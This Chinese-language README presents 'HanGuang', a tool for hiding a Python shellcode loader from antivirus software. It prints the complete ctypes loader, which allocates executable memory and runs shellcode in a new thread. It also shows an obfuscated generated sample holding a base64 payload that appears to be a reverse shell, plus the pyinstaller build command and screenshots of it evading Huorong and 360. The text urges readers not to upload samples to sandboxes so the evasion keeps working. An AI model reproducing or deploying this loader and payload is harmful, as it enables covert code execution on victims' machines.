## 含光---免杀生成器（含光的加载器编写思路）



### 最简单的加载器免杀思路

1. 将加载器的变量每次生成都要随机也就是变量混淆，
2. 同时在每行之间插入无效指令：比如随机打印，循环打印，随机数计算加减乘除

这个思路的主要作用是加载器伪装。不管shellcode如果变化加密解密，最后都要回到这个模板里面加载。就算是采用分离免杀的方法，shellcode本身不会被杀，但是这个加载器会被杀，所以经过这样伪装之后加载器可以存活，为后面各种花里胡哨的的免杀奠定基础。

<br>
source.py是模板
<br>
shellcode.py是本程序生成的加载器,可以使用pyinstaller直接构建成exe

### 实践过程

1. 这是从网上找来的python加载shellcode的代码，只要搜索谁都能找得到。把它作为模板进行伪装。

```python
import ctypes,base64,time


buf = ""

shellcode = bytearray(buf)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

# 放入shellcode
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

2. 先进行一个base的编码，方便将shellcode替换，因为要读raw原格式的payload，是二进制存储的。

![](img/HanGuang1.png)

3. 编写一个用来生成随机的类

   ![](img/HanGuang2.png)

4. 编写随机变量生成函数

模板中随机变量只有三个，分别是shellcode、ptr、buffered。只需要将这三个变量替换为随机字符串即可。

随机字符串这里设置为最小长度为5，最大长度为10，第一个字符不能为数字（因为这不符合python语法）。

![](img/HanGuang3.png)

5. 编写随机空白指令函数

   先在模板的每一行中间插入command1-7作为占位符，用来替换。同时添加flag_to_replace占位符用来替换shellcode。所以模板就变成了下面这样。

   ```python
   import ctypes,base64,time
   
   command1
   
   shellcode = base64.b64decode('flag_to_replace')
   
   command2
   
   shellcode = bytearray(shellcode)
   
   command3
   
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
   
   command4
   
   ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
   
   command5
   
   buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
   
   command5
   
   ctypes.windll.kernel32.RtlMoveMemory(
       ctypes.c_uint64(ptr), 
       buffered, 
       ctypes.c_int(len(shellcode))
   )
   
   command7
   
   handle = ctypes.windll.kernel32.CreateThread(
       ctypes.c_int(0), 
       ctypes.c_int(0), 
       ctypes.c_uint64(ptr), 
       ctypes.c_int(0), 
       ctypes.c_int(0), 
       ctypes.pointer(ctypes.c_int(0))
   )
   ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
   ```

   函数处理也很简单，只需要替换掉占位符即可

   ![](img/HanGuang4.png)

   生成空白指令函数也很简单，就是一个列表里面存了一些空白指令，然后从列表里面随机返回一个指令。当然空白指令也是随机生成的。

   ![](img/HanGuang5.png)

最终生成一个新的py文件，效果如下

```python
import ctypes,base64,time

neccpbehr7bzncnpqywr3v2ol1svhdf5sorlkam74un12v9e7oe0rwvsqgqdc41m2n98vla7evs74507267fjx3qp7dlhbubbvvn7k79xee2hop9y9qubj2ewhp3sb48hs1jutjttoqj8cv7m8tt4kcodmylsapgme8rbpvkkoq4mql82ez5tyehhygnk3s0hzpg4zlhzs8x7ju84e6x6acmnzrewpp6stb2q2g388ixfemy07cvr81szqg274k9clkug8t3vkbpkp7i5v2ztqug4lv7a65f2fubnxxj82o33tmvalu5zbyt5mda6p8zes6bstmwht23avbaci92ncppggtnbe37d648db3vbwipr38t8newrrrdhm2wngi27op1ix2eavi5mzlrhu7uvpscxsq0ggqfecihb9lxwg3p8h8lz1zbwkw7os41z3xgjj6kx54hf0vzqgwht1spbrb2wkt7nt1lu5p7eanl9r2fa3lzfujm6af809ywyh1doisakex5ijqo3h7v3qccayykmpbf4zztzpf821b350p5kk67364pltin0hrubn4ooglzkehc65xvoi94yp951mtm4candx8n4nu78q81sutt4v00h1mbasdw2ypqy8o9g3 = 42048826 - 7411178

s50zd4mc = base64.b64decode('/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKi1hUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V')

time.sleep(3)

s50zd4mc = bytearray(s50zd4mc)

bc53udd6mwe8ucehku7ac9jq82chpmeylog1dfnvjf63ipd4tj1y0fl8youygux5gdi3wygp0qiyoqbxx0een59un7pq8o7xwneqoi0arnopsjb3pvzkll7bji5z1ebobtrtm9dlpv63utnucm27sn96cs3zvkbzsxm1zzomp2db5zmlpmq3i2q6plpgm0l3tjtotdj7os6v9kb500mis0fpfn0yhh3myzzij8r7gdnyvoedhcnxpjxoogs95wkucczqmy9xr8qw5zfhzuaj87kxhmpt9wdx9s2q5wylfsvl8wr8mtl2vl6bc65dg4qqmfgrk2mn1tawb53bumgcrtcf7r1db6nyr1c3d592n6joftfbretjm1f2r7bnj3mu6trnjynvsp8juw3jxqk9jk8g87efy1jo231winmxscb2u2qhv0m3q5l1nizghyqpv7ilata7r26pqmlob3tt9rcyljcw5snjrt7b0tst08i5jostyyk0pxiidivo0uy68npugwl627c3ezht26miz4ltszk = "xaalc3nhqnszkylpx7t4gjukbs1re6dio2puzh3lwr8575ozew4hesx9aiyc1z1m9as5ghx4jc9f8i1lqhiqcgaddu1czescvrsf2dfsx5z7d09x1hh8fnv0914dyhp7gfh30ischxrqwfcfkcbqqhekki7m45hnfty2cbjd15mgq2dkrruunj78w6ao2xtbo3jhvfttc7ll46s1hezozx074j2oul4g8dfv1my9spaacrc2n8ase3x0pylcc5q4gtfoli9abakoz61fedfyjpis56w7bdhedvzwvgmma5b8vhk1tt8vfhcvz4mmdal7aaft7x76fnfto7a8nbbz593ua7b04m2vqbfwa6f2gwbxywo8suivisqln96ozl6k1x9oianju5awtzuk61iycoc75xwnm17xha7pp1pdm4m3aomvobtrcotd170xccplkrlypz6biuukkas970v5o9cxmveqdj87q3pkha1tyg3fysemkalme1wl9fhdohqvc6hrvlov4bty307c5dhdjupmbchch6zgkotlcmqg8uk4dv464c0er06x24eafdjr92i5a3a1b0suq9ujqcd0z8ef6dkqua54zyi9jpcdomza9g02v4k4r0nyixhjprfd95imprtiixcrdy79waunq4h25f4hn075rzy0alk1rnj3j0oqtuieqj5qg8ccz0mtc3gpswpyckryfydvt0nw8t6iapicbfu08rjqkce4rx8s0cybjiwowkfwbfjad49u06nm7p0md363b34vvvvejppx0utl3e47uez7l88mn2jvr5jx50clcw5ayy6afo0qpv36e9up5dbyk" + "dc8rclrz41gvmed5lhandwj87lifvvdwtk800lfrm4bf33og8a9o77y4x6ingugcimo7kldrmu0b01emm85jxs842gcdg6tmjcf56fysymyl1drlnunos5eja55b82yz9424vdt4stt7g2x81nqg7ch4gx0a5pxrr8frcbxk0zm7539a7ytu1v7ie2u2hx5yv6ev0pb5gsn8n0siykme0tlwqxfw7vrwm99gu216ciutwr5gu19cn1j9n6kujjyv5bbo2tbpded0ssij57cq4fcgmkjw91it3pyhjpbwhy2a4npxyz3j7l1pqppi1ykfm4kgrrwysptv0zzsjks47q989aegsdk27uqh5uj6hvpryz1cvpzodk38jwrqpf7cz4973w6fdptyoovwxfpqubdsk32fq3bcoxyr3a9nqckt7u90t48dxugkpnurnbr1iygu9qi77jqqi7d3k19ljdbogzqfxlsu8zbr8qkond492fwl71w74covapxl7aaxp6m4jx9204ym03rfyf9ewscugi2hom1vp5hnosifguw4v886zv2qji30vvtl1yjrago4tmmae0knkfyaakkh27l3a9fru7o93vtwfd48r4ffw73k8lp5k8g8q2tz052kndfpsdvkg93h9gsna85qt198h3niir72lo4dvh9lixtonvrpfo7skbosg2ps8wa1ja1uwul5s7uxrzj79soyo4aajok52sw3pvgj1ljmai40"

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

nds43ymxsskkaa25dkbcqysbkg8c3yzr6qdgnsb8vizunrexgmoz405d2x1enahbf0qvg9quiwpec39cgnmykcqi2aih52xu85n72b84gtsgu5z04qj6r5dgawxlsp1hbjpcetqtf4lxuj0k3a5y6dvhsb85dsso51ar4b9oqir40cbjqy5fvlqzx7cp86y1jvpuklbgbubj1nijs02gzt3ih7jg8ltzxfll2ul4pnsge6g9sypcmhv2anj4ipy74dhb8qglk8zgc0ez6sc6zbodrbeseleka2ze51dtm7dqtri1nn674x0e1j5jd5b8w9rjdub3f9dt22bshqw8vfmuz4zvfyjs2wv4fo1ne96cqvgiikv0j9aq66pth3qn0pieh2m43hmbjglzzj4exjjgi8g2893161b90asvuy0rm6ai4ho0ir3z9aibjydhdxrktq4fxat1n2qv12oj7zht6wafbg8430fk6wi9yzfhqn89waypsa4sj254bli99r8ddbkh4hfa5o5wsfw7oqargmpkvs68cna45ac20yorov9lve6dvxg4gwklfabj15zwsoi6k9iuy460hholsqcd3759klqjrw6s178ythm4wfi5ujrf2q6lzko1ikoc2698tribju621y2qbnk3i3jvecxlncbrvwc203mrdlytwxjmpvflw89mqu41opniz338y57h0x31 = 79966329 / 39623958

ui41vo0urj = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(s50zd4mc)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

ehvapdqxisaekt9fjnt1xyw03pqvrl08q4crdtpmkfj7heaabsjuvzjc8oqzok6jhlo9ymh31za3tueanzbqpj6m8hxxa2ux1ta4b3udhpdurdnk4ampyldamcpi8sj95rlz0xeecytbwbq46t473t9dpq8d8ocznfstrk9d9x5ncw8ntj0vd2miq79yusghldkn7cnunr5zzwz4m87lw6g4vn2lcf61skxmeuzadas71tc5tdl0w01uy43vyyb5nsaexj9udjaxxro3b0ge1rjbn8l9fm743pjoug17yi2w465c8txylb9iteoe6on3tzxq80jb5c9st100x5obxkdsv5hfjmv1ek89jjxkfyzgepup7vuu0ei51eo0p2win78t57w793471wuyzzir6e6t4p4tg3dot664jgy0tpaa9g4djhd8y7v6ts76mjlks4a0prkanh9gq5lmjefuat3a66cvyww38vq2o0qf77kp2nsa4s7syf66jtrd4jeqva10ds6w4ihz8sc6a8vaio55911sy3d9dp0bfeio4uxppk5nf2vq29asvytl6hcfroxjl6hpzsujlw6jvvhdm1ghmkjiqfmy6ouv6xa709xs9p5jj13t0iijy7okxcqrkmkpyemls1wwvdi0hj11nf1sj546v337zjyozepce3ob6jyexi53wrq2gnyvy5a025 = 338387 + 51678963

xqnsl = (ctypes.c_char * len(s50zd4mc)).from_buffer(s50zd4mc)

ehvapdqxisaekt9fjnt1xyw03pqvrl08q4crdtpmkfj7heaabsjuvzjc8oqzok6jhlo9ymh31za3tueanzbqpj6m8hxxa2ux1ta4b3udhpdurdnk4ampyldamcpi8sj95rlz0xeecytbwbq46t473t9dpq8d8ocznfstrk9d9x5ncw8ntj0vd2miq79yusghldkn7cnunr5zzwz4m87lw6g4vn2lcf61skxmeuzadas71tc5tdl0w01uy43vyyb5nsaexj9udjaxxro3b0ge1rjbn8l9fm743pjoug17yi2w465c8txylb9iteoe6on3tzxq80jb5c9st100x5obxkdsv5hfjmv1ek89jjxkfyzgepup7vuu0ei51eo0p2win78t57w793471wuyzzir6e6t4p4tg3dot664jgy0tpaa9g4djhd8y7v6ts76mjlks4a0prkanh9gq5lmjefuat3a66cvyww38vq2o0qf77kp2nsa4s7syf66jtrd4jeqva10ds6w4ihz8sc6a8vaio55911sy3d9dp0bfeio4uxppk5nf2vq29asvytl6hcfroxjl6hpzsujlw6jvvhdm1ghmkjiqfmy6ouv6xa709xs9p5jj13t0iijy7okxcqrkmkpyemls1wwvdi0hj11nf1sj546v337zjyozepce3ob6jyexi53wrq2gnyvy5a025 = 338387 + 51678963

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ui41vo0urj), 
    xqnsl, 
    ctypes.c_int(len(s50zd4mc))
)

print("y5v8cap00i4ofd2qmwbsqrkx55oo85b36mdmdfnin9dada8eigu9mwwgsiilccyz0mqs5093c02oxd6gez7rdf9mrlh7597epbiurh1th1tzp7nmtba548veex163593kg4jx45hyuhnrcz9aanpirlowbvmua5f3yrs9kthg5d94b25y2gwiiy9owp7lxz1y0a8o0utcxgvkfv2relwf9hhn7int1jibwfmp83pfyz0mf5g8dl975ic5b3xt4f72rs7f4zl4rcx6vgi1pyhiztz9kxyy8ah8gdggtjyj9luxpyoj0638p80l2rmmbp3hof5jh1po9hnii2hggkch8k6natj0kz1r37l0oytpkl7ac3bi6n98qelitt18kvosh6kqbt1xec676k3s6d72nhzt1pa86fkp91xvicuh2mv3vpkvt9jxmaf3ktf201zrjs296wwu6881nk07vxipprspsthbzlu4jsiwca1gvwu1b7pun1satn4lfvh61j0o8dq6dzxaqgjnaz4h9v8etwvaqkwy62hfrjgenrtup2iktedcxs59fk88zwsm5as5wa8w1hodhc3qgaopo7udkta9j1prdoacsduqf9ce4nsjka1a4baf320ydmifcaufd94zemh58e6cbgc45cxdh86tosw4ib4nzi0m81vqbex9nd2rrgdtusu7ussok7ab7flph4ld3wthwjc12bvdfzfuye3kauqbq9u1")

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ui41vo0urj), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

最后使用pyinstaller打包成exe

```
pyinstaller -F shellcode.py
```



### 效果展示（2021年3月24日）

#### 火绒

![](img/HanGuang8.png)

#### 360

![](img/HanGuang9.png)

![](img/HanGuang10.png)

![](img/HanGuang11.png)





TODO：使用其他语言重构（c语言，go语言等），尽量减小体积和特征。



##  内部免杀工具含光加载器部分使用的是这个思路，由于某些原因不便开放源代码。

打包发布一个精简版本，可以去 [release]( https://github.com/MrWQ/HanGuang/releases) 下载使用，低调使用。

为了持久免杀，不要上传沙箱。

为了持久免杀，不要上传沙箱。

为了持久免杀，不要上传沙箱。

免责声明：仅供学习交流切勿用于非法用途。
